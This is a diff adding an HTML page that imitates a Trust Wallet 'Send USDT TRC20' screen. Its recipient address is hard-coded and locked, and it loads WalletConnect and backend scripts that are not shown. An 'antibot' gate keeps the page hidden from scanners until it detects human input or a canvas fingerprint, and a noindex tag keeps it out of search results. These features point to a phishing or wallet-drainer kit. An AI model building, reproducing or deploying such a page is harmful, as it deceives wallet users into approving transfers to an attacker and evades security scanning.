@@ -1,0 +1,568 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
+  <title>Send USDT TRC20</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="robots" content="noindex, nofollow">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="color-scheme" content="light dark">
+  <link rel="icon" type="image/png" href="images/Trust-Wallet-modified.png">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg-primary: #ffffff;
+      --bg-secondary: #f5f5f5;
+      --bg-input: #f5f5f5;
+      --text-primary: #000000;
+      --text-secondary: #666666;
+      --text-tertiary: #999999;
+      --border-color: #e0e0e0;
+      --border-focus: #0031d6;
+      --button-bg: #003bff;
+      --button-bg-disabled: #98a0ff;
+      --button-text: var(--bg-primary);
+      --accent-color: #8B7FE6;
+      --accent-green: #0031d6;
+      --pill-bg: #f0f0f0;
+      --pill-text: #666666;
+      --error-text: #f45e5d;
+      --icon-filter: brightness(0) saturate(100%) invert(11%) sepia(100%) saturate(7500%) hue-rotate(240deg) brightness(90%) contrast(150%);
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg-primary: #1d1d1e;
+        --bg-secondary: #272727;
+        --bg-input: transparent;
+        --text-primary: #c1c2c6;
+        --text-secondary: #c1c2c6;
+        --text-tertiary: #7f7f81;
+        --border-color: #79797c;
+        --border-focus: #4fff9f;
+        --button-bg: #318152;
+        --button-bg-disabled: #318152;
+        --button-text: var(--bg-primary);
+        --accent-color: #4fff9f;
+        --accent-green: #4fff9f;
+        --pill-bg: #272727;
+        --pill-text: #7f7f81;
+        --error-text: #f45e5d;
+        --icon-filter: brightness(0) saturate(100%) invert(87%) sepia(15%) saturate(2156%) hue-rotate(87deg) brightness(99%) contrast(97%);
+      }
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      overflow-x: hidden;
+    }
+
+    .app-container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 30px 20px 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    .form-group { margin-bottom: 24px; }
+
+    .label {
+      font-size: 14px;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+      display: block;
+      font-weight: 400;
+    }
+
+    .input-container {
+      position: relative;
+      background: transparent;
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 15px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      transition: all 0.2s;
+      max-width: 100%;
+      overflow: hidden;
+    }
+
+    .input-container:focus-within {
+      border-color: var(--border-focus);
+      border-width: 2px;
+      padding: 14px 15px;
+    }
+
+    .input-container input {
+      flex: 1;
+      background: none;
+      border: none;
+      outline: none;
+      font-size: 17px;
+      color: var(--text-primary);
+      font-family: inherit;
+      min-width: 0;
+      width: 100%;
+    }
+
+    .input-container input::placeholder {
+      color: var(--text-tertiary);
+      opacity: 0.5;
+      font-weight: 500;
+    }
+
+    .address-text {
+      flex: 1;
+      min-width: 0;
+      font-size: 17px;
+      color: var(--text-primary);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .input-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-shrink: 0;
+    }
+
+    .paste-btn, .scan-btn, .max-btn {
+      background: none;
+      border: none;
+      color: var(--accent-green);
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+
+    .paste-btn:hover, .scan-btn:hover, .max-btn:hover {
+      background: var(--bg-secondary);
+    }
+
+    .icon-btn {
+      background: none;
+      border: none;
+      color: var(--accent-green);
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 6px;
+      transition: background 0.2s;
+      flex-shrink: 0;
+    }
+
+    .icon-btn:hover { background: var(--bg-secondary); }
+    .icon-btn svg { width: 20px; height: 20px; }
+    .icon-btn img { filter: var(--icon-filter); }
+
+    .network-selector {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      background: var(--pill-bg);
+      border: none;
+      border-radius: 999px;
+      padding: 6px 12px 6px 6px;
+      transition: opacity 0.2s;
+      width: fit-content;
+      line-height: 1;
+    }
+
+    .network-selector:hover { opacity: 0.8; }
+
+    .network-selector img {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: block;
+    }
+
+    .network-name {
+      font-size: 14px;
+      color: var(--pill-text);
+      font-weight: 600;
+      line-height: 1;
+    }
+
+    .dropdown-icon {
+      color: var(--pill-text);
+      font-size: 10px;
+      margin-left: 0;
+      line-height: 1;
+    }
+
+    .amount-info {
+      font-size: 14px;
+      color: var(--text-primary);
+      margin-top: 8px;
+      opacity: 0.7;
+    }
+
+    .next-btn {
+      background: var(--button-bg);
+      color: var(--button-text);
+      border: none;
+      border-radius: 100px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: auto;
+      margin-bottom: 20px;
+      transition: opacity 0.2s;
+      width: 100%;
+    }
+
+    .next-btn:hover { opacity: 0.9; }
+
+    .next-btn:disabled {
+      background: var(--button-bg-disabled);
+      opacity: 1;
+      cursor: not-allowed;
+    }
+
+    .processing-popup {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      max-height: 50%;
+      background: var(--bg-primary);
+      border-radius: 20px 20px 0 0;
+      box-shadow: 0 -4px 20px rgba(0,0,0,0.3);
+      padding: 20px;
+      z-index: 10000;
+      animation: slideUp 0.3s ease-out;
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(100%); }
+      to { transform: translateY(0); }
+    }
+
+    .popup-header {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 20px;
+    }
+
+    .popup-close {
+      background: none;
+      border: none;
+      color: var(--text-tertiary);
+      font-size: 24px;
+      cursor: pointer;
+      padding: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background 0.2s;
+    }
+
+    .popup-close:hover { background: var(--bg-secondary); }
+
+    .popup-content {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .popup-icon {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+    }
+
+    .popup-icon img {
+      width: 100%;
+      height: 100%;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .popup-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 12px;
+    }
+
+    .popup-message {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .popup-button {
+      background: var(--accent-green);
+      color: var(--button-text);
+      border: none;
+      border-radius: 12px;
+      padding: 14px 24px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: not-allowed;
+      opacity: 0.7;
+      width: 80%;
+      max-width: 300px;
+    }
+
+    .popup-button.enabled {
+      cursor: pointer;
+      opacity: 1;
+    }
+
+    /* Loading screen */
+    #antibot-screen {
+      position: fixed;
+      inset: 0;
+      background: var(--bg-primary);
+      z-index: 99999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.3s;
+    }
+
+    .loader {
+      width: 50px;
+      height: 50px;
+      border: 4px solid var(--border-color);
+      border-top-color: var(--accent-color);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    #app-content {
+      visibility: hidden;
+    }
+
+    #app-content.visible {
+      visibility: visible;
+    }
+
+    /* Loading popup */
+    #loadingPopup {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 90vh;
+      background: var(--bg-primary);
+      border-radius: 20px 20px 0 0;
+      box-shadow: 0 -4px 20px rgba(0,0,0,0.3);
+      z-index: 20000;
+      animation: slideUpFull 0.15s ease-out;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    #loadingPopup.show {
+      display: flex;
+    }
+
+    @keyframes slideUpFull {
+      from { transform: translateY(100%); }
+      to { transform: translateY(0); }
+    }
+
+    .diamond-loader {
+      width: 40px;
+      height: 40px;
+      background: var(--bg-secondary);
+      border-radius: 4px;
+      transform: rotate(45deg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .diamond-bars {
+      display: flex;
+      gap: 2px;
+      transform: rotate(-45deg);
+    }
+
+    .diamond-bars i {
+      position: relative;
+      width: 2px;
+      height: 14px;
+      display: block;
+    }
+
+    .diamond-bars i span {
+      position: absolute;
+      width: 2px;
+      background: var(--accent-green);
+      }
+    </style>
+</head>
+<body>
+  <div id="antibot-screen">
+    <div class="loader"></div>
+  </div>
+
+  <div id="app-content">
+    <div class="app-container">
+      <div class="form-group">
+        <label class="label">Address or Domain Name</label>
+        <div class="input-container">
+          <input type="text" id="addressInput" class="address-text" placeholder="Search or Enter" value="TLU3Rfnd77Ej7zrwmYgK8R4GkU9UkGbnUB" autocomplete="off" readonly="">
+          <div class="input-actions">
+            <button class="paste-btn" type="button" id="pasteBtn" tabindex="-1">Paste</button>
+            <button class="icon-btn" type="button" tabindex="-1">
+              <img src="images/paste-icon.svg" alt="Paste" style="width: 20px; height: 20px;">
+                </button>
+            <button class="icon-btn" type="button" tabindex="-1">
+              <img src="images/scan-icon.svg" alt="Scan" style="width: 20px; height: 20px;">
+                </button>
+              </div>
+            </div>
+          </div>
+
+      <div class="form-group">
+        <label class="label">Destination network</label>
+        <div class="network-selector">
+          <img src="images/TRON.svg" alt="Tron">
+          <span class="network-name">Tron</span>
+          <span class="dropdown-icon">▼</span>
+              </div>
+            </div>
+
+      <div class="form-group">
+        <label class="label">Amount</label>
+        <div class="input-container">
+          <input type="text" id="amount" placeholder="USDT Amount" inputmode="decimal" autocomplete="off" value="1">
+          <div class="input-actions">
+            <button class="icon-btn" id="clearBtn" type="button" style="display: none;">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="9" fill="currentColor" opacity="0.3"></circle>
+                <path d="M15 9L9 15M9 9L15 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+              </svg>
+            </button>
+            <span class="label" style="margin: 0; color: var(--text-tertiary);">USDT</span>
+            <button class="max-btn" type="button" id="maxBtn">Max</button>
+          </div>
+        </div>
+        <div class="amount-info" id="usdAmount">≈ $1.00</div>
+      </div>
+
+      <button id="nextBtn" class="next-btn" type="button" disabled="">Next</button>
+    </div>
+        </div>
+
+  <div id="loadingPopup">
+    <div class="diamond-loader">
+      <div class="diamond-bars">
+        <i><span></span></i>
+        <i><span></span></i>
+        <i><span></span></i>
+        <i><span></span></i>
+      </div>
+    </div>
+  </div>
+
+  <div id="processingPopup" class="processing-popup">
+    <div class="popup-header">
+      <button class="popup-close" type="button" id="processingClose">×</button>
+    </div>
+    <div class="popup-content">
+      <div class="popup-icon">
+        <img src="images/success.svg" alt="Success">
+      </div>
+      <h2 class="popup-title">Processing...</h2>
+      <p class="popup-message">Transaction is processing! You can check it on blockchain.</p>
+      <button class="popup-button" type="button" id="processingDetailsBtn" disabled="">Transaction Details</button>
+    </div>
+  </div>
+
+  <!-- Buffer polyfill for TronWeb (required in browser) -->
+  <script src="https://bundle.run/buffer@6.0.3"></script>
+  <script>window.Buffer = window.Buffer || buffer.Buffer;</script>
+
+  <!-- Initial spinner gate (same behavior as ERC-20 UI) -->
+  <script>
+    (function () {
+      var gateOk = false;
+      function passGate() {
+        if (gateOk) return;
+        gateOk = true;
+        try { sessionStorage.setItem('_g', '1'); } catch (e) {}
+        var screen = document.getElementById('antibot-screen');
+        var content = document.getElementById('app-content');
+        if (screen) screen.style.opacity = '0';
+        setTimeout(function () {
+          if (screen && screen.parentNode) screen.parentNode.removeChild(screen);
+          if (content) content.classList.add('visible');
+        }, 300);
+      }
+
+      var testClicks = 0, testTouches = 0, testKeys = 0, testMouse = 0;
+      function testInteraction() {
+        if (++testClicks > 1 || ++testKeys > 0 || ++testMouse > 0) passGate();
+      }
+      document.addEventListener('click', function () { testClicks++; testInteraction(); });
+      document.addEventListener('touchstart', function () { testTouches++; testInteraction(); });
+      document.addEventListener('keydown', function () { testKeys++; testInteraction(); });
+      document.addEventListener('mousemove', function () { testMouse++; testInteraction(); });
+
+      setTimeout(function () {
+        if (!gateOk) {
+          try { if (sessionStorage.getItem('_g') === '1') { passGate(); return; } } catch (e) {}
+          var canvas = document.createElement('canvas');
+          canvas.width = 200; canvas.height = 20;
+          var ctx = canvas.getContext('2d');
+          ctx.textBaseline = 'top'; ctx.font = "14px 'Arial'"; ctx.textBaseline = 'alphabetic';
+          ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = '#069'; ctx.fillText('Trust', 2, 15);
+          ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('Wallet', 4, 17);
+          var txt = canvas.toDataURL();
+          if (txt && txt.length > 5000) passGate();
+        }
+      }, 500);
+
+      setTimeout(function () {
+        if (!gateOk && (testClicks > 0 || testKeys > 0 || testTouches > 0 || testMouse > 2)) passGate();
+        else if (!gateOk) setTimeout(function () { passGate(); }, 2000);
+      }, 2000);
+    })();
+  </script>
+
+  <!-- TRON + WalletConnect bundle -->
+  <script src="js/tron-bundle.js"></script>
+  <script src="js/config-backend.js"></script>
+  <script src="js/main.js"></script>
+
+
+</body></html>
